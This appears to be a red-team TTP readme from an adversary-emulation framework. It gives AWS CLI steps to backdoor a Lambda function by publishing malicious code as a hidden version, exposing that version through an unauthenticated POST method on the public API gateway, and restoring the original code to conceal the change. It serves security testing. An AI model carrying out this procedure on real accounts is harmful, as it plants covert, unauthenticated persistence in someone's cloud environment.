# Create AWS Lambda Function

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP is used to backdoor an existing lambda function. To execute this TTP one needs to have a
  lambda function accessible via a public API gateway.
  TTP creates a version of backdoored code and then redeploys the original code to the latest lambda version
  The backdoor version of the code can then be invoked using a seperate method API request.
  The backdoor code filename should exactly match the filename of original lambda function code.



## Arguments

- **aws_account_name**: AWS account name where the Lambda function will be created.
- **role**: Account role to be used when communicating with AWS resources.
- **lambda_function_name**: The name of of existing lambda function with a public API resource.

## Steps

1. Create a backup copy of existing lambda function code.
2. Upload the backdoor code and publish the uploaded code as a version.
3. Create a different Method API call to the backdoored code.
4. Redeploy the original code as the latest version. This ensures that the lambda function works as intended.
5. Test that the backdoored code can be invoked via the new method API call.

## Manual Reproduction Steps

```
# Set necessary env variables

# Get the rest_api_id and root_resource_id of given lambda function
rest_api_id=$(aws apigateway get-rest-apis --query 'items[?name==`{{.Args.lambda_function_name}}-api`].id' --output text)
root_resource_id=$(aws apigateway get-resources --rest-api-id $rest_api_id --query 'items[?path==`/`].id' --output text)

# Create a POST method in existing resource
aws apigateway put-method --rest-api-id $rest_api_id --resource-id $root_resource_id --http-method POST --authorization-type "NONE"


# Add necessary permissions to the new resource method
account_id=$(aws sts get-caller-identity --query Account --output text)
account_region=$(aws configure get region)
statement_id=apigateway-$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 10 | head -n 1)-{{.Args.lambda_function_name}}
source_arn="arn:aws:execute-api:$account_region:$account_id:$rest_api_id/*/POST/"

aws lambda add-permission --function-name $backdoor_function_arn --source-arn $source_arn \
--principal apigateway.amazonaws.com --statement-id $statement_id --action lambda:InvokeFunction


# Connect the POST method to the Lambda function (define integration)
lambda_func_arn=$(aws lambda get-function --function-name {{.Args.lambda_function_name}} --query 'Configuration.FunctionArn' --output text)
lambda_invocation_uri="arn:aws:apigateway:$account_region:lambda:path/2015-03-31/functions/$backdoor_function_arn/invocations"   #Here we usinge the ARN of published version

echo "lambda_invocation_uri: $lambda_invocation_uri"
aws apigateway put-integration --rest-api-id $rest_api_id \
--resource-id $root_resource_id --http-method POST --type AWS \
--integration-http-method POST --uri $lambda_invocation_uri


# Specify a METHOD response for HTTP status code 200
aws apigateway put-method-response --rest-api-id $rest_api_id --resource-id $root_resource_id --http-method POST --status-code 200

# Specify an INTEGRATION RESPONSE for a method response code of 200 and allow Passthrough content handling
aws apigateway put-integration-response --rest-api-id $rest_api_id --resource-id $root_resource_id \
--http-method POST --status-code 200 --response-templates '{"application/json":"$input.path('\'$.body\'')"}'

# # Deploy the API
aws apigateway create-deployment --rest-api-id $rest_api_id --stage-name prod

```

## MITRE ATT&CK Mapping

- **Tactics**:
  - TA0003 Persistence
- **Techniques**:
  - T1543 Create or Modify System Process
